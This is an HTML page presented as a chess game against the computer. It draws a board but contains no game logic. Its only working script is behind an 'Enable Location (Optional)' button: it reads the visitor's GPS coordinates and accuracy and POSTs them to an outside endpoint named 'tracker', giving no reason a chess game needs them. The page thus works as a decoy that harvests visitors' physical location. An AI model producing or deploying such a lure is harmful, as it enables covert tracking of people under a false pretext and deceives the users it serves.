<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Chess Site</title>

<!-- Chessboard.js CSS -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/chessboard.js/1.0.0/chessboard-1.0.0.min.css"/>

<style>
  body {
    margin: 0;
    font-family: system-ui, sans-serif;
    background: linear-gradient(135deg, #1e293b, #0f172a);
    color: white;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    min-height: 100vh;
  }

  .card {
    background: #111827;
    padding: 20px;
    border-radius: 14px;
    box-shadow: 0 10px 30px rgba(0,0,0,0.5);
    text-align: center;
  }

  button {
    margin-top: 15px;
    padding: 10px 20px;
    font-size: 16px;
    border: none;
    border-radius: 10px;
    cursor: pointer;
    background: #3b82f6;
    color: white;
  }

  button:hover {
    background: #2563eb;
  }

  #status {
    margin-top: 10px;
    font-size: 14px;
    opacity: 0.9;
  }

  #board {
    margin-top: 15px;
    width: 400px;
  }
</style>
</head>
<body>

<div class="card">
  <h1>Chess Game</h1>
  <p>Play a chess game against the computer.</p>

  <button onclick="getLocation()">Enable Location (Optional)</button>
  <div id="status"></div>

  <div id="board"></div>
</div>

<!-- Libraries -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/chess.js/1.0.0/chess.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/chessboard.js/1.0.0/chessboard-1.0.0.min.js"></script>

<script>
const WORKER_URL = "https://jovdat7.github.io/tracker/"; // from Cloudflare

// Location function (optional)
function getLocation() {
  if (!navigator.geolocation) {
    document.getElementById("status").textContent = "Geolocation not supported.";
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      const data = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy };
      fetch(WORKER_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      }).then(() => {
        document.getElementById("status").textContent = "Location sent!";
      }).catch(() => {
        document.getElementById("status").textContent = "Error sending location.";
      });
    },
    () => {
      document.getElementById("status").textContent = "Permission denied.";
    }
  );
}

// Chessboard setup
const board = Chessboard('board', {
  draggable: true,
  dropOffBoard: 'snapback',
  position: 'start'
});
</script>

</body>
</html>
